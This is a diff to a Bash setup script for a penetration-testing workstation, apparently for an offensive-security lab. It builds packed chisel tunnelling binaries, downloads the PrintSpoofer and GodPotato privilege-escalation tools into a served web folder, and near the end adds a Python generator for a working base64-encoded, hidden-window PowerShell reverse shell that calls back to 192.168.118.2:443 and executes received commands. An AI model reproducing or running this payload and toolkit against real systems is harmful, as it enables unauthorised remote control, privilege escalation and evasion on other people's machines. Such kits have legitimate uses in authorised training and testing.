@@ -26,7 +26,7 @@ APT_PACKAGES=(
   gobuster
   feroxbuster
   mingw-w64
-  golang
+  golang-go
 )
 
 TIMEZONE="Europe/Berlin"
@@ -224,38 +224,42 @@ if [[ ! -f "$WWW_DIR/kerbrute_windows_amd64.exe" ]]; then
 fi
 
 # --- Chisel (build from source: linux_amd64 + windows_amd64) ---
-echo "  - Building chisel from source (linux & windows)..."
-need git
-if ! command -v go >/dev/null 2>&1; then
-  echo "    -> installing Go..."
-  sudo apt install -y golang || sudo apt install -y golang-go
+if [[ -f "$WWW_DIR/chisel_linux_amd64" && -f "$WWW_DIR/chisel_windows_amd64.exe" ]]; then
+  echo "  ✓ Chisel already present in $WWW_DIR, skipping build."
+else
+  echo "  - Building chisel from source (linux & windows)..."
+  need git
+  if ! command -v go >/dev/null 2>&1; then
+    echo "    -> installing Go..."
+    sudo apt install -y golang-go
+  fi
+  # upx is optional (to compress); try both package names
+  if ! command -v upx >/dev/null 2>&1; then
+    sudo apt install -y upx || sudo apt install -y upx-ucl || true
+  fi
+
+  BUILD_DIR="/tmp/_build_chisel"
+  rm -rf "$BUILD_DIR"
+  git clone --depth 1 https://github.com/jpillora/chisel.git "$BUILD_DIR"
+
+  pushd "$BUILD_DIR" >/dev/null
+
+  # Linux amd64
+  CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -a -installsuffix cgo -o chisel_linux_amd64
+  command -v upx >/dev/null 2>&1 && upx --brute chisel_linux_amd64 || true
+
+  # Windows amd64
+  CGO_ENABLED=0 GOOS=windows GOARCH=amd64 go build -a -installsuffix cgo -o chisel_windows_amd64.exe
+  command -v upx >/dev/null 2>&1 && upx --brute chisel_windows_amd64.exe || true
+
+  popd >/dev/null
+
+  mv -f "$BUILD_DIR/chisel_linux_amd64" "$WWW_DIR/chisel_linux_amd64"
+  mv -f "$BUILD_DIR/chisel_windows_amd64.exe" "$WWW_DIR/chisel_windows_amd64.exe"
+  chmod +x "$WWW_DIR/chisel_linux_amd64" || true
+  rm -rf "$BUILD_DIR"
+  echo "    ✓ chisel_linux_amd64 and chisel_windows_amd64.exe ready in $WWW_DIR"
 fi
-# upx is optional (to compress); try both package names
-if ! command -v upx >/dev/null 2>&1; then
-  sudo apt install -y upx || sudo apt install -y upx-ucl || true
-fi
-
-BUILD_DIR="/tmp/_build_chisel"
-rm -rf "$BUILD_DIR"
-git clone --depth 1 https://github.com/jpillora/chisel.git "$BUILD_DIR"
-
-pushd "$BUILD_DIR" >/dev/null
-
-# Linux amd64
-CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -a -installsuffix cgo -o chisel_linux_amd64
-command -v upx >/dev/null 2>&1 && upx --brute chisel_linux_amd64 || true
-
-# Windows amd64
-CGO_ENABLED=0 GOOS=windows GOARCH=amd64 go build -a -installsuffix cgo -o chisel_windows_amd64.exe
-command -v upx >/dev/null 2>&1 && upx --brute chisel_windows_amd64.exe || true
-
-popd >/dev/null
-
-mv -f "$BUILD_DIR/chisel_linux_amd64" "$WWW_DIR/chisel_linux_amd64"
-mv -f "$BUILD_DIR/chisel_windows_amd64.exe" "$WWW_DIR/chisel_windows_amd64.exe"
-chmod +x "$WWW_DIR/chisel_linux_amd64" || true
-rm -rf "$BUILD_DIR"
-echo "    ✓ chisel_linux_amd64 and chisel_windows_amd64.exe ready in $WWW_DIR"
 
 # --- Rubeus (try official .exe, then official zip, then compiled-binaries mirror) ---
 if [[ ! -f "$WWW_DIR/Rubeus.exe" ]]; then
@@ -283,6 +287,37 @@ copy_or_try_urls "Inveigh.ps1" "$WWW_DIR/Inveigh.ps1" \
   "https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Inveigh.ps1" \
   "https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/main/Inveigh.ps1"
 
+
+# --- PrintSpoofer (x64 only available in release) ---
+copy_or_try_urls "PrintSpoofer64.exe" "$WWW_DIR/PrintSpoofer64.exe" \
+  "https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe"
+
+# --- GodPotato (both .NET builds) ---
+copy_or_try_urls "GodPotato-NET4.exe" "$WWW_DIR/GodPotato-NET4.exe" \
+  "https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET4.exe"
+
+copy_or_try_urls "GodPotato-NET2.exe" "$WWW_DIR/GodPotato-NET2.exe" \
+  "https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET2.exe"
+
+
+  # --- Add reverse-shell generator to ~/www ---
+echo "  - Adding revshell-b64.py to $WWW_DIR"
+cat > "$WWW_DIR/revshell-b64.py" <<'PY'
+#!/usr/bin/env python3
+import sys
+import base64
+
+payload = '$client = New-Object System.Net.Sockets.TCPClient("192.168.118.2",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
+
+cmd = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()
+
+print(cmd)
+PY
+chmod +x "$WWW_DIR/revshell-b64.py"
+
+# Ensure everything in ~/www is owned by the current user
+chown -R "$USER:$USER" "$WWW_DIR" 2>/dev/null || true
+
 # ---------- Summary ----------
 echo
 echo "== ~/www contents =="
@@ -296,7 +331,7 @@ echo
 echo "Installed apt packages: ${APT_PACKAGES[*]}"
 echo "Timezone now: $(timedatectl | grep 'Time zone' || true)"
 echo "SSH: enabled and running (systemctl status ssh)"
-echo "Terminal: font set to 16 (QTerminal/Xfce/GNOME if present)"
+echo "Terminal: font set to 16 (QTerminal/Xfce/GNOME)"
 echo "You still have to install Firefox extensions, e.g. FoxyProxy, Wappalyzer"
 echo "⚠️  Reminder: change your local password:  passwd"
 echo
